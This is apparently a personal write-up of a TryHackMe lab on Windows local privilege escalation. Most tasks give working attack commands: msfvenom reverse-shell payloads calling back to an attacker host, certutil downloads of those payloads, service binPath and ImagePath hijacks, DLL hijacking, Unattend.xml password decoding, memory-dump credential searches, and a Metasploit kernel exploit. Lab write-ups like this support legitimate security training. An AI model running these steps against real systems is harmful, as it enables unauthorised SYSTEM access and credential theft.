# TryHackMe — Windows PrivEsc Arena

**Room:** [tryhackme.com/room/windowsprivescarena](https://tryhackme.com/room/windowsprivescarena)
**Difficulty:** Medium
**Category:** Windows Privilege Escalation

A hands-on room covering the most common Windows local privilege escalation vectors: registry misconfigurations, weak service permissions, unquoted paths, DLL hijacking, potato exploits, credential mining, and kernel exploits.

---

## Table of Contents

- [Setup — Connecting to the THM VPN](#setup--connecting-to-the-thm-vpn)
- [Task 2 — Deploy the Machine](#task-2--deploy-the-machine)
- [Task 3 — Registry Escalation: Autorun](#task-3--registry-escalation-autorun)
- [Task 4 — Registry Escalation: AlwaysInstallElevated](#task-4--registry-escalation-alwaysinstallelevated)
- [Task 5 — Service Escalation: Registry](#task-5--service-escalation-registry)
- [Task 6 — Service Escalation: Executable Files](#task-6--service-escalation-executable-files)
- [Task 7 — Startup Applications](#task-7--startup-applications)
- [Task 8 — Service Escalation: DLL Hijacking](#task-8--service-escalation-dll-hijacking)
- [Task 9 — Service Escalation: binPath (Weak DACL)](#task-9--service-escalation-binpath-weak-dacl)
- [Task 10 — Unquoted Service Paths](#task-10--unquoted-service-paths)
- [Task 11 — Potato Escalation: Hot Potato](#task-11--potato-escalation-hot-potato)
- [Task 12 — Password Mining: Configuration Files](#task-12--password-mining-configuration-files)
- [Task 13 — Password Mining: Memory](#task-13--password-mining-memory)
- [Task 14 — Kernel Exploits](#task-14--kernel-exploits)
- [Summary Table](#summary-table)

---

## Setup — Connecting to the THM VPN

```bash
# Download your .ovpn from TryHackMe → Access → OpenVPN
mkdir -p ~/thm && mv ~/Downloads/*.ovpn ~/thm/

# Connect (leave running in its own terminal)
sudo openvpn ~/thm/yourfile.ovpn

# In a new tab, verify the tunnel
ip a tun0
ping <target-ip>
```

---

## Task 2 — Deploy the Machine

1. Click **Start Machine** on the room page and note the assigned IP.
2. RDP into the box with the provided credentials:

```bash
xfreerdp /u:<user> /p:<pass> /v:<target-ip> /cert:ignore
```

3. Enumerate local users:

```
net user
```

**Answer:** the other non-default user is `TCM`.

---

## Task 3 — Registry Escalation: Autorun

**Concept:** Binaries referenced in `HKLM\...\Run` execute at every logon, including admin logons. If the file/folder is writable by a low-privileged user, it can be replaced.

```
# Inspect autorun entries
Autoruns64.exe        # check the Logon tab

# Check folder/file permissions
accesschk64.exe -uwqv "Users" C:\path\to\autorun\folder
```

Generate and serve a payload:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<kali-ip> LPORT=4444 -f exe -o shell.exe
python3 -m http.server 8000
```

Pull it down on the target and replace the autorun binary:

```
certutil.exe -urlcache -f http://<kali-ip>:8000/shell.exe program.exe
```

Set up the handler:

```
msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST <kali-ip>; set LPORT 4444; run"
```

> **Note:** If ACLs deny write access to non-admins on the autorun path, this vector is correctly blocked — worth documenting as a negative finding rather than a failure.

---

## Task 4 — Registry Escalation: AlwaysInstallElevated

**Concept:** If both registry keys below are set to `1`, any user can install an `.msi` with SYSTEM privileges.

```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

Generate a malicious MSI:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<kali-ip> LPORT=4444 -f msi -o setup.msi
```

Transfer and install on target:

```
certutil.exe -urlcache -f http://<kali-ip>:8000/setup.msi setup.msi
msiexec /quiet /qn /i setup.msi
```

Catch the shell on the handler → **NT AUTHORITY\SYSTEM**.

---

## Task 5 — Service Escalation: Registry

**Concept:** If a service's `ImagePath` registry value is writable by your user, point it at your own binary — it runs with the service's (SYSTEM) privileges on start.

```
accesschk64.exe -kvuqsw hklm\system\currentcontrolset\services\regsvc
```

If `Users` have write/full control:

```
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\temp\shell.exe /f
net start regsvc
```

Catch shell → SYSTEM.

---

## Task 6 — Service Escalation: Executable Files

**Concept:** The service binary itself on disk is writable, rather than the registry key.

```
accesschk64.exe -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
```

If writable:

```
copy /y shell.exe "C:\Program Files\File Permissions Service\filepermservice.exe"
net start filepermservice
```

Catch shell → SYSTEM.

---

## Task 7 — Startup Applications

**Concept:** Files in the all-users Startup folder run for *any* user who logs in, including administrators.

```
icacls "C:\Users\All Users\Microsoft\Windows\Start Menu\Programs\StartUp"
```

If `BUILTIN\Users` has write access:

```
copy shell.exe "C:\Users\All Users\Microsoft\Windows\Start Menu\Programs\StartUp\shell.exe"
```

Start a handler, then wait for (or trigger) another user's logon (e.g. RDP as `TCM`). The payload fires on next logon, returning a shell as that user.

---

## Task 8 — Service Escalation: DLL Hijacking

**Concept:** A service searches for a DLL it can't find, or from a directory you control — drop a malicious DLL matching the expected name.

1. Open **Process Monitor**, filter: `Result = NAME NOT FOUND`, `Path ends with .dll`, Process = the vulnerable service binary.
2. Restart the service to trigger the search:

```
net stop dllsvc & net start dllsvc
```

3. Build a matching malicious DLL:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<kali-ip> LPORT=4444 -f dll -o hijackme.dll
```

4. Transfer it into the expected path and restart the service:

```
certutil.exe -urlcache -f http://<kali-ip>:8000/hijackme.dll hijackme.dll
net stop dllsvc & net start dllsvc
```

> If no callback returns, verify the DLL's exports match what the service actually calls — msfvenom's default export table doesn't always line up.

---

## Task 9 — Service Escalation: binPath (Weak DACL)

**Concept:** If your user has `SERVICE_CHANGE_CONFIG` rights on a service, you can repoint its binary path directly — no file/registry write access needed.

```
accesschk64.exe -uwcqv "Users" daclsvc
```

If `SERVICE_ALL_ACCESS` / `SERVICE_CHANGE_CONFIG` is granted to `Users`:

```
sc config daclsvc binpath= "net localgroup administrators <youruser> /add"
net start daclsvc
```

Log off/on to reflect new group membership.

---

## Task 10 — Unquoted Service Paths

**Concept:** An unquoted path like `C:\Program Files\Unquoted Path Service\common.exe` lets Windows try each space-delimited segment as an executable (`C:\Program.exe`, `C:\Program Files\Unquoted.exe`, etc). A writable folder in that chain = code execution as the service account.

```
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows"
icacls "C:\Program Files\Unquoted Path Service\"
```

Drop the payload matching the exposed segment name:

```
copy shell.exe "C:\Program Files\Unquoted Path Service\common.exe"
sc start unquotedsvc
```

Catch shell → SYSTEM.

---

## Task 11 — Potato Escalation: Hot Potato

**Concept:** NBNS spoofing + fake WPAD coerce a SYSTEM-level service to authenticate to you via NTLM, which is then relayed to escalate privileges. Effective on older/unpatched builds.

```
powershell -ep bypass
Import-Module .\Tater.ps1
Invoke-Tater -Trigger 1
```

Confirm escalation:

```
net localgroup administrators
```

---

## Task 12 — Password Mining: Configuration Files

**Concept:** Deployment/config files often retain credentials — `Unattend.xml`, `web.config`, `Sysprep.inf`. Passwords in `Unattend.xml` are Base64-encoded, not encrypted.

```
type C:\Windows\Panther\Unattend.xml
```

or search broadly:

```
dir /s /b unattend.xml sysprep.inf sysprep.xml web.config
```

Decode the `<Password>` value:

```bash
echo "<base64string>" | base64 -d
```

**Answer:** `password123`

---

## Task 13 — Password Mining: Memory

**Concept:** Applications sometimes hold credentials in process memory (e.g. a browser mid-HTTP Basic Auth prompt). Dumping the process and searching strings can recover the cleartext.

1. Trigger the credential prompt (e.g. a Metasploit `auxiliary/server/capture/http_basic` module hit via Internet Explorer).
2. Task Manager → right-click the process (`iexplore.exe`) → **Create Dump File**.
3. Search the dump:

```
strings iexplore.DMP | findstr /i "password"
```

---

## Task 14 — Kernel Exploits

**Concept:** When no config/service misconfig exists, an unpatched kernel CVE can grant SYSTEM directly.

From an existing low-priv meterpreter session:

```
background
use post/multi/recon/local_exploit_suggester
set SESSION <id>
run
```

Use the suggested exploit matching the target's patch level — this room's intended path is **MS16-014**:

```
use exploit/windows/local/ms16_014_wmi_recv_notif
set SESSION <id>
set LHOST <kali-ip>
run
```

---

## Summary Table

| Task | Technique                        | Result                          |
|------|-----------------------------------|----------------------------------|
| 3    | Autorun registry                  | Blocked by ACL (documented)     |
| 4    | AlwaysInstallElevated              | SYSTEM                          |
| 5    | Service registry `ImagePath`       | SYSTEM                          |
| 6    | Writable service executable        | SYSTEM                          |
| 7    | Startup folder                     | Shell as `TCM-PC\TCM`           |
| 8    | DLL Hijacking                      | SYSTEM (export match required)  |
| 9    | Weak service DACL / binPath        | Local Admin                     |
| 10   | Unquoted service path              | SYSTEM                          |
| 11   | Hot Potato                         | Local Admin                     |
| 12   | Unattend.xml                       | Credential: `password123`       |
| 13   | Memory dump                        | Credential recovered            |
| 14   | MS16-014 kernel exploit            | SYSTEM                          |

---

## References

- [TryHackMe — Windows PrivEsc Arena](https://tryhackme.com/room/windowsprivescarena)
- [GTFOBins / LOLBAS](https://lolbas-project.github.io/) — for living-off-the-land techniques
- [PayloadsAllTheThings — Windows PrivEsc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

---

*Notes written for personal study / CTF documentation purposes.*
